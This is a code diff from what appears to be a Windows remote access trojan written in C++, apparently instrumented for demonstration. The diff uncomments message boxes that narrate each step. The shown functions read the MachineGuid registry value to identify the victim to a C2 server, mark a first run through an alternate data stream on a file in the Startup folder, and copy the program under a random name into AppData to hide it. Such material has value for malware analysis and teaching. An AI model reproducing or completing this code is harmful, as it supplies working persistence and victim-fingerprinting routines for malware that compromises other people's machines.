@@ -3,7 +3,7 @@
 BOOL GetEncryptedMachineGUID(const WCHAR* encryptedMachineGuid, DWORD size) {
 	// encrypted Machine GUID later
 	HKEY hKey;
-	//MessageBox(NULL, L"MachineGUID is the sensitive information of a Windows machine. In this context, it is used to identify the machine on server C2.\nGet it from RegKey: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid", L"Info", MB_OK);
+	MessageBox(NULL, L"MachineGUID is the sensitive information of a Windows machine. In this context, it is used to identify the machine on server C2.\nGet it from RegKey: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid", L"Info", MB_OK);
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
 		return FALSE;
 	}
@@ -12,14 +12,14 @@ BOOL GetEncryptedMachineGUID(const WCHAR* encryptedMachineGuid, DWORD size) {
 		RegCloseKey(hKey);
 		return FALSE;
 	}
-	//MessageBox(NULL, encryptedMachineGuid, L"Info", MB_OK);
+	MessageBox(NULL, encryptedMachineGuid, L"Info", MB_OK);
 	RegCloseKey(hKey);
 	return TRUE;
 }
 
 BOOL IsFirstTime() {
-	//MessageBox(NULL, L"1. When running, RAT checks if it has run on this machine before by checking an ADS on file C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\config.ini:$DATA", L"Flow", MB_OK);
-	//MessageBox(NULL, L"If it is marked meaning this is not the first time running on this machine\nElse this is the first time! Mark it!", L"Flow", MB_OK);
+	MessageBox(NULL, L"1. When running, RAT checks if it has run on this machine before by checking an ADS on file C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\config.ini:$DATA", L"Flow", MB_OK);
+	MessageBox(NULL, L"If it is marked meaning this is not the first time running on this machine\nElse this is the first time! Mark it!", L"Flow", MB_OK);
 
 	WCHAR userProfile[MAX_PATH];
 	GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
@@ -116,7 +116,7 @@ WCHAR* GenerateRandomFileName() {
 }
 
 BOOL CopyToAppData(const WCHAR* currentPath, WCHAR* newPath) {
-	//MessageBox(NULL, L"If this is the first time, RAT hides by copy itself to C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows with a new name: ", L"Flow", MB_OK);
+	MessageBox(NULL, L"If this is the first time, RAT hides by copy itself to C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows with a new name: ", L"Flow", MB_OK);
 	WCHAR appDataPath[MAX_PATH];
 	if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
 		return FALSE;
@@ -131,7 +131,7 @@ BOOL CopyToAppData(const WCHAR* currentPath, WCHAR* newPath) {
 
 	// Create random file name 
 	WCHAR* randomFileName = GenerateRandomFileName();
-	//MessageBox(NULL, randomFileName, L"Flow", MB_OK);
+	MessageBox(NULL, randomFileName, L"Flow", MB_OK);
 	wcscpy_s(newPath, MAX_PATH, newDir);
 	wcscat_s(newPath, MAX_PATH, L"\\");
 	wcscat_s(newPath, MAX_PATH, randomFileName);
